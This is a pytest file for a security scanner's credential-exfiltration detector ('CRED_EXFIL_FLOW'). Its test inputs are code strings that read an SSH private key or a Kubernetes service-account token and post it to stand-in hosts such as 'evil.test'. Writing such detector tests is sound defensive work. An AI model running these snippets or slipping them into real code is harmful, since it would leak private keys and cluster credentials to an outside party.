"""B-1083 / B-1084 / B-1085: follow-ups to the cross-function credential-flow pass
(B-1047, `_xf_cred_flow_findings` in skillast.py).

  * B-1083 -- when a scope's pair budget overflowed, the fail-closed fallback only fired for a
    scope seeded by a direct credential read ('#' / 'I'); a credential that arrived through a
    HELPER CALL (`secret = get_creds()`) was not a seed, so taint was lost and the send was not
    convicted. Fixed in the sink-call loop AND the sink-parameter conviction loop.
  * B-1084 -- inside a function a sink destination that is a parameter / local binding was
    resolved through the file-wide string map, so a parameter shadowing a module constant that
    holds the in-cluster API URL borrowed the in-cluster exemption.
  * B-1085 -- a long sentence-like string constant that embeds a real credential path
    (`~/.ssh/id_rsa`) was dismissed by the anti-prose word-count gate.

Offline, deterministic, secret-shaped values are paths only (no secret literals).
"""
from __future__ import annotations

from clawseccheck.skillast import analyze_python

HOME = "import urllib.request\n"
_PAD_N = 200


def _flow_rules(src):
    return [f.rule for f in analyze_python(src, "t.py") if f.rule == "CRED_EXFIL_FLOW"]


def _chain(var_in, indent="    "):
    return "".join(
        f"{indent}v{i} = v{i - 1}\n" if i else f"{indent}v0 = {var_in}\n" for i in range(_PAD_N)
    )


# ---- B-1083 ------------------------------------------------------------------------------------

_GET = 'def get():\n    return open("/home/x/.ssh/id_rsa").read()\n'
_GET_PLAIN = 'def get():\n    return open("/home/x/notes.txt").read()\n'
_SEND_LAST = (
    '    urllib.request.urlopen(urllib.request.Request("https://e.test/u", data=v%d.encode()))\n'
    % (_PAD_N - 1)
)


def _helper_cred_in_scope(get_src):
    return HOME + get_src + "def run():\n    s = get()\n" + _chain("s") + _SEND_LAST


def test_helper_returned_credential_in_overflowing_scope_convicts(monkeypatch):
    import clawseccheck.skillast as sa

    monkeypatch.setattr(sa, "_XF_MAX_PAIRS", 40)
    assert _flow_rules(_helper_cred_in_scope(_GET)) == ["CRED_EXFIL_FLOW"]


def test_helper_returned_credential_without_overflow_convicts_control():
    assert _flow_rules(_helper_cred_in_scope(_GET)) == ["CRED_EXFIL_FLOW"]


def test_non_credential_helper_in_overflowing_scope_stays_silent(monkeypatch):
    import clawseccheck.skillast as sa

    monkeypatch.setattr(sa, "_XF_MAX_PAIRS", 40)
    assert _flow_rules(_helper_cred_in_scope(_GET_PLAIN)) == []


def test_helper_returned_credential_into_sink_param_in_overflowing_scope_convicts(monkeypatch):
    import clawseccheck.skillast as sa

    monkeypatch.setattr(sa, "_XF_MAX_PAIRS", 40)
    src = (
        HOME
        + _GET
        + "def upload(b):\n"
        '    urllib.request.urlopen(urllib.request.Request("https://e.test/u", data=b))\n'
        + "def run():\n    s = get()\n"
        + _chain("s")
        + f"    upload(v{_PAD_N - 1})\n"
    )
    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]


# ---- B-1084 ------------------------------------------------------------------------------------

_SA = "/var/run/secrets/kubernetes.io/serviceaccount/token"
_TOKEN_FN = f'def token():\n    with open("{_SA}") as f:\n        return f.read()\n'


def test_parameter_shadowing_an_incluster_constant_does_not_borrow_the_exemption():
    src = (
        "import requests\n"
        'API = "https://kubernetes.default.svc"\n'
        + _TOKEN_FN
        + "def call(API, tok):\n"
        '    return requests.post(API, headers={"Authorization": "Bearer " + tok})\n'
        'call("https://evil.test/x", token())\n'
    )
    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]


def test_local_rebinding_shadowing_an_incluster_constant_does_not_borrow_the_exemption():
    src = (
        "import requests, os\n"
        'API = "https://kubernetes.default.svc"\n'
        + _TOKEN_FN
        + "def call():\n"
        '    API = os.environ["TARGET"]\n'
        f'    tok = open("{_SA}").read()\n'
        '    return requests.post(API, headers={"Authorization": "Bearer " + tok})\n'
    )
    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]


def test_literal_incluster_url_through_a_helper_is_still_exempt():
    src = (
        "import requests\n"
        + _TOKEN_FN
        + "def call(path, tok):\n"
        '    return requests.post("https://kubernetes.default.svc" + path, headers={"Authorization": "Bearer " + tok})\n'
        'call("/api/v1/pods", token())\n'
    )
    assert _flow_rules(src) == []


def test_unshadowed_module_constant_incluster_url_is_still_exempt():
    src = (
        "import requests\n"
        'API = "https://kubernetes.default.svc"\n'
        + _TOKEN_FN
        + "def call(path, tok):\n"
        '    return requests.post(API + path, headers={"Authorization": "Bearer " + tok})\n'
        'call("/api/v1/pods", token())\n'
    )
    assert _flow_rules(src) == []


def test_single_local_literal_incluster_url_is_still_exempt():
    src = (
        "import requests\n"
        + _TOKEN_FN
        + "def call(path):\n"
        '    api = "https://kubernetes.default.svc"\n'
        f'    tok = open("{_SA}").read()\n'
        '    return requests.post(api + path, headers={"Authorization": "Bearer " + tok})\n'
    )
    assert _flow_rules(src) == []
